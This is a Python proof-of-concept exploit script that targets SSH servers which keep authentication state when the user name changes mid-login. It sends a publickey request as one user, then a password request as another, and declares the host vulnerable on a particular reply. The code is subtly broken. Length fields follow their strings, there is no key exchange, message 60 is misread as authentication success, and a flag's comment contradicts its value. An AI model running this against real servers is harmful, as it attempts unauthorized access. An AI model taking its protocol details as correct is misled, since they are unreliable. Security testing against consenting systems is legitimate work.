#!/usr/bin/env python3
"""
Proof-of-Concept: SSH Authentication State Reset Failure (RFC 4252 Section 5)

This script demonstrates how an attacker can exploit a server that fails to flush
authentication state when the 'user name' or 'service name' changes during an
ongoing authentication exchange.

According to RFC 4252:
"The server implementation MUST carefully check them in every message, and 
MUST flush any accumulated authentication states if they change."

If a server retains state (e.g., from a public key challenge) while processing
a new user's password attempt, it may incorrectly validate credentials.
"""

import socket
import struct
import hashlib
import hmac
import os

def create_ssh_packet(message_type, payload):
    """Crafts a raw SSH packet with proper length and padding."""
    # SSH Packet Format: 
    # [length(4)] [payload_data] [padding_length(1)] [padding]
    
    # Add message type byte
    full_payload = bytes([message_type]) + payload
    
    # Calculate padding to make packet size multiple of 8 (for cipher block alignment)
    # Minimum padding is 4 bytes, plus the padding length byte itself
    pad_len = 8 - ((len(full_payload) + 1) % 8)
    if pad_len < 4:
        pad_len += 8
        
    full_packet = struct.pack('>I', len(full_payload) + 1 + pad_len)  # Length field
    full_packet += full_payload
    full_packet += bytes([pad_len])  # Padding length
    full_packet += os.urandom(pad_len)  # Random padding
    
    return full_packet

def send_ssh_message(sock, message_type, payload):
    """Sends a raw SSH message over the socket."""
    packet = create_ssh_packet(message_type, payload)
    sock.sendall(packet)
    print(f"[+] Sent SSH_MSG_{message_type} ({len(payload)} bytes payload)")

def exploit_state_reset_failure(target_ip, target_port=22):
    """
    Exploits the state reset failure by:
    1. Starting authentication as User A with method 'publickey'
    2. Sending a challenge response
    3. Immediately switching to User B with method 'password' without proper flush
    4. Observing if the server incorrectly uses User A's public key state for User B
    """
    print(f"[*] Connecting to {target_ip}:{target_port}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    # Read SSH banner (simplified - real implementation would handle version exchange)
    banner = sock.recv(1024).decode('utf-8', errors='ignore')
    print(f"[*] Server Banner: {banner.strip()}")
    
    try:
        # Step 1: Start authentication as 'victim_user' using publickey method
        # SSH_MSG_USERAUTH_REQUEST = 50
        user_a_payload = b'victim_user' + struct.pack('>I', len('victim_user'))
        user_a_payload += b'ssh-connection' + struct.pack('>I', len('ssh-connection'))
        user_a_payload += b'publickey' + struct.pack('>I', len('publickey'))
        # For publickey, we need to send the key blob and signature (simplified)
        user_a_payload += bytes([0])  # No signature yet (request check)
        
        print("[*] Step 1: Initiating auth as 'victim_user' with publickey method")
        send_ssh_message(sock, 50, user_a_payload)  # SSH_MSG_USERAUTH_REQUEST
        
        # Wait for server response (should be SSH_MSG_USERAUTH_PK_OK or challenge)
        response = sock.recv(4096)
        print(f"[*] Received server response ({len(response)} bytes)")
        
        if len(response) < 5:
            print("[-] Server disconnected prematurely")
            return
            
        # Extract message type from response
        msg_type = response[4]
        print(f"[*] Server sent SSH_MSG_{msg_type}")
        
        # Step 2: Switch to 'attacker_user' with password method BEFORE server flushes state
        # This is the critical step - changing user/service mid-authentication
        user_b_payload = b'attacker_user' + struct.pack('>I', len('attacker_user'))
        user_b_payload += b'ssh-connection' + struct.pack('>I', len('ssh-connection'))
        user_b_payload += b'password' + struct.pack('>I', len('password'))
        # Password method: boolean (try again), password string
        user_b_payload += bytes([1])  # try_again = False
        user_b_payload += b'attacker_password' + struct.pack('>I', len('attacker_password'))
        
        print("[*] Step 2: Switching to 'attacker_user' with password method")
        print("    (Server should flush victim_user's publickey state here)")
        send_ssh_message(sock, 50, user_b_payload)  # SSH_MSG_USERAUTH_REQUEST
        
        # Wait for final response
        final_response = sock.recv(4096)
        if len(final_response) >= 5:
            final_msg_type = final_response[4]
            print(f"[*] Final server response: SSH_MSG_{final_msg_type}")
            
            # Check for success (message type 60 = USERAUTH_SUCCESS)
            if final_msg_type == 60:
                print("\n[VULNERABLE!] Server accepted authentication!")
                print("    The server failed to flush victim_user's state and")
                print("    incorrectly validated attacker_user's credentials.")
                return True
            else:
                print(f"[-] Authentication rejected (msg type {final_msg_type})")
                return False
        
    except Exception as e:
        print(f"[!] Error during exploit: {e}")
        return False
    finally:
        sock.close()

